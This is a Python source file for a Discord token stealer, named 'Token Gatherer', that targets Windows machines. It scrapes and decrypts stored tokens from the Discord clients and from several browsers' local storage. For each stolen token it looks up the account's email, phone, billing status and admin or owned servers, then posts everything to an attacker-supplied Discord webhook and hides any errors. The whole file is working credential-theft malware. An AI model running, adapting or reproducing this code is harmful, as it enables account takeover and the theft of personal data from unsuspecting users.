import base64
import json
import os
import re
import requests
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from typing import List, Dict, Optional, Any

class TokenExtractor:
    def __init__(self):
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens: List[str] = []
        
    def get_browser_paths(self):
        return {
            'Discord': f'{self.roaming}\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': f'{self.roaming}\\discordcanary\\Local Storage\\leveldb\\',
            'Discord PTB': f'{self.roaming}\\discordptb\\Local Storage\\leveldb\\',
            'Chrome': f'{self.appdata}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Opera': f'{self.roaming}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': f'{self.roaming}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Microsoft Edge': f'{self.appdata}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': f'{self.appdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': f'{self.appdata}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\'
        }

    def decrypt_token(self, buff: bytes, master_key: bytes) -> Optional[str]:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception:
            return None

    def get_master_key(self, path: str) -> Optional[bytes]:
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = CryptUnprotectData(master_key[5:], None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def validate_token(self, token: str) -> bool:
        try:
            response = requests.get(
                self.base_url, 
                headers={'Authorization': token},
                timeout=5
            )
            return response.status_code == 200
        except Exception:
            return False

    def extract(self) -> List[Dict[str, Any]]:
        token_info_list = []
        sources = {}
        
        for name, path in self.get_browser_paths().items():
            if not os.path.exists(path):
                continue

            discord_process = "cord" in path.lower()
            if discord_process:
                local_state_path = os.path.join(self.roaming, name.replace(" ", "").lower(), 'Local State')
                if not os.path.exists(local_state_path):
                    continue
                master_key = self.get_master_key(local_state_path)
                if not master_key:
                    continue

            for file_name in os.listdir(path):
                if not file_name.endswith(('.log', '.ldb')):
                    continue

                try:
                    with open(os.path.join(path, file_name), errors='ignore') as file:
                        for line in file.readlines():
                            line = line.strip()
                            if discord_process:
                                for match in re.findall(self.regexp_enc, line):
                                    token_enc = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
                                    token = self.decrypt_token(token_enc, master_key)
                                    if token and self.validate_token(token) and token not in self.tokens:
                                        self.tokens.append(token)
                                        sources[token] = name
                            else:
                                for token in re.findall(self.regexp, line):
                                    if self.validate_token(token) and token not in self.tokens:
                                        self.tokens.append(token)
                                        sources[token] = name
                except Exception:
                    continue

        for token in self.tokens:
            token_info = self.get_account_info(token)
            token_info["source"] = sources.get(token, "Unknown")
            token_info_list.append(token_info)

        return token_info_list

    def get_account_info(self, token: str) -> Dict[str, Any]:
        base_info = {
            "token": token,
            "valid": True,
            "username": "Unknown",
            "id": "Unknown",
            "email": "Unknown",
            "phone": "Unknown",
            "avatar": None,
            "nitro": False,
            "billing": False,
            "mfa": False
        }
        
        try:
            user_response = requests.get(
                self.base_url,
                headers={"Authorization": token},
                timeout=5
            )
            
            if user_response.status_code == 200:
                user_data = user_response.json()
                base_info["username"] = f"{user_data.get('username', 'Unknown')}#{user_data.get('discriminator', '0000')}"
                base_info["id"] = user_data.get("id", "Unknown")
                base_info["email"] = user_data.get("email", "None")
                base_info["phone"] = user_data.get("phone", "None")
                base_info["avatar"] = f"https://cdn.discordapp.com/avatars/{user_data.get('id')}/{user_data.get('avatar')}.png" if user_data.get("avatar") else None
                base_info["mfa"] = user_data.get("mfa_enabled", False)

                nitro_resp = requests.get(
                    "https://discord.com/api/v9/users/@me/billing/subscriptions",
                    headers={"Authorization": token},
                    timeout=5
                )
                base_info["nitro"] = len(nitro_resp.json()) > 0 if nitro_resp.status_code == 200 else False
                
                billing_resp = requests.get(
                    "https://discord.com/api/v9/users/@me/billing/payment-sources",
                    headers={"Authorization": token},
                    timeout=5
                )
                base_info["billing"] = len(billing_resp.json()) > 0 if billing_resp.status_code == 200 else False
                
                guilds_resp = requests.get(
                    "https://discord.com/api/v9/users/@me/guilds",
                    headers={"Authorization": token},
                    timeout=5
                )
                
                if guilds_resp.status_code == 200:
                    guilds = guilds_resp.json()
                    base_info["guilds_count"] = len(guilds)
                    
                    admin_guilds = [
                        guild for guild in guilds 
                        if (guild.get("permissions", 0) & 0x8) == 0x8
                    ]
                    base_info["admin_guilds_count"] = len(admin_guilds)
                    owned_guilds = [
                        guild for guild in guilds 
                        if guild.get("owner", False)
                    ]
                    base_info["owned_guilds_count"] = len(owned_guilds)
                    
                    important_guilds = []
                    for guild in (owned_guilds + admin_guilds)[:5]:
                        important_guilds.append({
                            "name": guild.get("name", "Unknown"),
                            "id": guild.get("id", "Unknown"),
                            "owner": guild.get("owner", False),
                            "admin": (guild.get("permissions", 0) & 0x8) == 0x8
                        })
                    
                    base_info["important_guilds"] = important_guilds
                
                friends_resp = requests.get(
                    "https://discord.com/api/v9/users/@me/relationships",
                    headers={"Authorization": token},
                    timeout=5
                )
                
                if friends_resp.status_code == 200:
                    friends = friends_resp.json()
                    base_info["friends_count"] = len(friends)
        except Exception:
            base_info["valid"] = False
            
        return base_info

class DiscordWebhook:
    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
        
    def send_tokens(self, token_info_list: List[Dict[str, Any]]) -> bool:
        if not token_info_list:
            return False
            
        embeds = [{
            "color": 0xb869a3,
            "footer": {
                "text": f"Total Tokens Found: {len(token_info_list)}"
            }
        }]
        
        for info in token_info_list:
            token_embed = {
                "title": f"👤 {info['username']}",
                "description": f"**Token:** ||`{info['token']}`||\n**ID:** `{info['id']}`\n**Email:** `{info['email']}`\n**Phone:** `{info['phone']}`\n**2FA:** `{info['mfa']}`\n**Nitro:** `{info['nitro']}`\n**Billing:** `{info['billing']}`\n**Source:** `{info['source']}`",
                "color": 0x5865F2,
                "thumbnail": {"url": info['avatar']} if info['avatar'] else None,
                "fields": []
            }
            
            if "guilds_count" in info:
                guild_info = f"**Total:** `{info.get('guilds_count', '?')}`\n**Admin:** `{info.get('admin_guilds_count', '?')}`\n**Owned:** `{info.get('owned_guilds_count', '?')}`"
                
                if info.get("important_guilds"):
                    guild_info += "\n\n**Notable Servers:**\n"
                    for guild in info["important_guilds"]:
                        role = "Owner" if guild["owner"] else "Admin"
                        guild_info += f"`{guild['name']}` ({role})\n"
                
                token_embed["fields"].append({
                    "name": "🛡️ Servers",
                    "value": guild_info,
                    "inline": True
                })
            
            if "friends_count" in info:
                token_embed["fields"].append({
                    "name": "👥 Friends",
                    "value": f"`{info['friends_count']}`",
                    "inline": True
                })
                
            embeds.append(token_embed)
        
        embed_chunks = [embeds[i:i+10] for i in range(0, len(embeds), 10)]
        
        success = True
        for chunk in embed_chunks:
            try:
                payload = {
                    "username": "Token Gatherer",
                    "avatar_url": "https://i.pinimg.com/736x/82/32/35/823235534eab0f3bef0ca979aa425e9d.jpg",
                    "embeds": chunk
                }
                
                response = requests.post(
                    self.webhook_url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=5
                )
                success = success and response.status_code == 204
            except Exception:
                success = False
        
        return success

def main(webhook_url: str):
    extractor = TokenExtractor()
    token_info_list = extractor.extract()
    
    if token_info_list:
        webhook = DiscordWebhook(webhook_url)
        webhook.send_tokens(token_info_list)

if __name__ == "__main__":
    WEBHOOK_URL = "https://discord.com/api/webhooks/ ? "
    try:
        import uuid 
        main(WEBHOOK_URL)
    except Exception:
        pass
